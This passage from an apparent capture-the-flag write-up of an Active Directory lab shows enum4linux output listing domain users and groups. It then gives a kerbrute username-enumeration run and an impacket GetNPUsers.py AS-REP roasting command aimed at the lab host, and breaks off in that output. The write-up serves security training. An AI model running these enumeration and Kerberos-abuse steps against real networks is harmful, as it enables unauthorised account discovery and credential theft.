</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 74</span><span><span style="color:#fe8019">[</span>E<span style="color:#fe8019">]</span> Unexpected error from polenum:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 75</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 76</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 77</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 78</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Attaching to 10.10.157.30 using a NULL share
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 79</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 80</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Trying protocol 139/SMB...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 81</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 82</span><span>        <span style="color:#fe8019">[</span>!<span style="color:#fe8019">]</span> Protocol failed: Cannot request session <span style="color:#fe8019">(</span>Called Name:10.10.157.30<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 83</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 84</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Trying protocol 445/SMB...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 85</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 86</span><span>        <span style="color:#fe8019">[</span>!<span style="color:#fe8019">]</span> Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span style="color:#fe8019">{</span>Access Denied<span style="color:#fe8019">}</span> A process has requested access to an object but has not been granted those access rights.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 87</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 88</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 89</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 90</span><span><span style="color:#fe8019">[</span>E<span style="color:#fe8019">]</span> Failed to get password policy with rpcclient
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 91</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 92</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 93</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 94</span><span> <span style="color:#fe8019">=======================================(</span> Groups on 10.10.157.30 <span style="color:#fe8019">)=======================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 95</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 96</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 97</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Getting <span style="color:#fabd2f">builtin</span> groups:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 98</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 99</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">100</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span>  Getting <span style="color:#fabd2f">builtin</span> group memberships:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">101</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">102</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">103</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span>  Getting <span style="color:#fabd2f">local</span> groups:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">104</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">105</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">106</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span>  Getting <span style="color:#fabd2f">local</span> group memberships:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">107</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">108</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">109</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span>  Getting domain groups:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">110</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">111</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">112</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span>  Getting domain group memberships:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">113</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">114</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">115</span><span> <span style="color:#fe8019">==================(</span> Users on 10.10.157.30 via RID cycling <span style="color:#fe8019">(</span>RIDS: 500-550,1000-1050<span style="color:#fe8019">)</span> <span style="color:#fe8019">)==================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">116</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">117</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">118</span><span><span style="color:#fe8019">[</span>I<span style="color:#fe8019">]</span> Found new SID:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">119</span><span>S-1-5-21-3591857110-2884097990-301047963
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">120</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">121</span><span><span style="color:#fe8019">[</span>I<span style="color:#fe8019">]</span> Found new SID:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">122</span><span>S-1-5-21-3591857110-2884097990-301047963
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">123</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">124</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username <span style="color:#b8bb26">&#39;&#39;</span>, password <span style="color:#b8bb26">&#39;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">125</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">126</span><span>S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC<span style="color:#b8bb26">\A</span>dministrator <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">127</span><span>S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC<span style="color:#b8bb26">\G</span>uest <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">128</span><span>S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC<span style="color:#b8bb26">\D</span>efaultAccount <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">129</span><span>S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC<span style="color:#b8bb26">\W</span>DAGUtilityAccount <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">130</span><span>S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC<span style="color:#b8bb26">\N</span>one <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">131</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">132</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username <span style="color:#b8bb26">&#39;&#39;</span>, password <span style="color:#b8bb26">&#39;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">133</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">134</span><span>S-1-5-21-3591857110-2884097990-301047963-500 THM-AD<span style="color:#b8bb26">\A</span>dministrator <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">135</span><span>S-1-5-21-3591857110-2884097990-301047963-501 THM-AD<span style="color:#b8bb26">\G</span>uest <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">136</span><span>S-1-5-21-3591857110-2884097990-301047963-502 THM-AD<span style="color:#b8bb26">\k</span>rbtgt <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">137</span><span>S-1-5-21-3591857110-2884097990-301047963-512 THM-AD<span style="color:#b8bb26">\D</span>omain Admins <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">138</span><span>S-1-5-21-3591857110-2884097990-301047963-513 THM-AD<span style="color:#b8bb26">\D</span>omain Users <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">139</span><span>S-1-5-21-3591857110-2884097990-301047963-514 THM-AD<span style="color:#b8bb26">\D</span>omain Guests <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">140</span><span>S-1-5-21-3591857110-2884097990-301047963-515 THM-AD<span style="color:#b8bb26">\D</span>omain Computers <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">141</span><span>S-1-5-21-3591857110-2884097990-301047963-516 THM-AD<span style="color:#b8bb26">\D</span>omain Controllers <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">142</span><span>S-1-5-21-3591857110-2884097990-301047963-517 THM-AD<span style="color:#b8bb26">\C</span>ert Publishers <span style="color:#fe8019">(</span>Local Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">143</span><span>S-1-5-21-3591857110-2884097990-301047963-518 THM-AD<span style="color:#b8bb26">\S</span>chema Admins <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">144</span><span>S-1-5-21-3591857110-2884097990-301047963-519 THM-AD<span style="color:#b8bb26">\E</span>nterprise Admins <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">145</span><span>S-1-5-21-3591857110-2884097990-301047963-520 THM-AD<span style="color:#b8bb26">\G</span>roup Policy Creator Owners <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">146</span><span>S-1-5-21-3591857110-2884097990-301047963-521 THM-AD<span style="color:#b8bb26">\R</span>ead-only Domain Controllers <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">147</span><span>S-1-5-21-3591857110-2884097990-301047963-522 THM-AD<span style="color:#b8bb26">\C</span>loneable Domain Controllers <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">148</span><span>S-1-5-21-3591857110-2884097990-301047963-525 THM-AD<span style="color:#b8bb26">\P</span>rotected Users <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">149</span><span>S-1-5-21-3591857110-2884097990-301047963-526 THM-AD<span style="color:#b8bb26">\K</span>ey Admins <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">150</span><span>S-1-5-21-3591857110-2884097990-301047963-527 THM-AD<span style="color:#b8bb26">\E</span>nterprise Key Admins <span style="color:#fe8019">(</span>Domain Group<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">151</span><span>S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD<span style="color:#b8bb26">\A</span>TTACKTIVEDIREC$ <span style="color:#fe8019">(</span>Local User<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">152</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">153</span><span> <span style="color:#fe8019">===============================(</span> Getting printer info <span style="color:#fe8019">for</span> 10.10.157.30 <span style="color:#fe8019">)===============================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">154</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">155</span><span>do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">156</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">157</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">158</span><span>enum4linux <span style="color:#fabd2f">complete</span> on Mon Jul <span style="color:#d3869b">10</span> 19:06:28 <span style="color:#d3869b">2023</span>
</span></span></code></pre></div><p>From the information that we gathered here, we can enumerate usernames with kerbrute.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/attacktive<span style="color:#fe8019">]</span>$ kerbrute userenum --dc 10.10.157.30 -d thm-ad userlist.txt
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>    __             __               __
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>   / /_____  _____/ /_  _______  __/ /____
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>  / //_/ _ <span style="color:#b8bb26">\/</span> ___/ __ <span style="color:#b8bb26">\/</span> ___/ / / / __/ _ <span style="color:#b8bb26">\
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span><span style="color:#b8bb26"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>/_/|_|<span style="color:#b8bb26">\_</span>__/_/  /_.___/_/   <span style="color:#b8bb26">\_</span>_,_/<span style="color:#b8bb26">\_</span>_/<span style="color:#b8bb26">\_</span>__/
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>Version: v1.0.3 <span style="color:#fe8019">(</span>9dad6e1<span style="color:#fe8019">)</span> - 07/10/23 - Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>2023/07/10 19:08:17 &gt;  Using KDC<span style="color:#fe8019">(</span>s<span style="color:#fe8019">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>2023/07/10 19:08:17 &gt;   10.10.157.30:88
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>2023/07/10 19:08:18 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       james@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>2023/07/10 19:08:22 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       svc-admin@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>2023/07/10 19:08:27 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       James@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>2023/07/10 19:08:29 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       robin@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>2023/07/10 19:08:48 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       darkstar@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>2023/07/10 19:09:00 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       administrator@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>2023/07/10 19:09:24 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       backup@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>2023/07/10 19:09:35 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       paradox@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">22</span><span>2023/07/10 19:10:46 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       JAMES@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">23</span><span>2023/07/10 19:11:10 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       Robin@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">24</span><span>2023/07/10 19:13:35 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       Administrator@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">25</span><span>2023/07/10 19:18:24 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       Darkstar@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">26</span><span>2023/07/10 19:19:59 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       Paradox@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">27</span><span>2023/07/10 19:25:14 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       DARKSTAR@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">28</span><span>2023/07/10 19:26:44 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       ori@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">29</span><span>2023/07/10 19:29:33 &gt;  <span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> VALID USERNAME:       ROBIN@thm-ad
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">30</span><span>2023/07/10 19:36:29 &gt;  Done! Tested <span style="color:#d3869b">73317</span> usernames <span style="color:#fe8019">(</span><span style="color:#d3869b">16</span> valid<span style="color:#fe8019">)</span> in 1692.112 seconds
</span></span></code></pre></div><h2 id="abusing-kerberos">Abusing Kerberos</h2>
<p>We can use a tool from impacket called <code>GetNPUsers.py</code> to query for users that are potentially vulnerable to ASREPRoasting.</p>
<p>ASReproasting occurs when a user account has the privilege &ldquo;Does not require Pre-Authentication&rdquo; set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/attacktive<span style="color:#fe8019">]</span>$ GetNPUsers.py spookysec.local/ -dc-ip 10.10.157.30 -usersfile validusers.txt -no-pass
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span style="color:#d3869b">2</span> is no longer supported by the Python core team. Support <span style="color:#fe8019">for</span> it is now deprecated in cryptography, and will be removed in the next release.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Impacket v0.9.19 - Copyright <span style="color:#d3869b">2019</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span><span style="color:#fe8019">[</span>-<span style="color:#fe8019">]</span> User james doesn<span style="color:#b8bb26">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span><span style="color:#b8bb26">[-] User ori doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span style="color:#fabd2f">set</span>
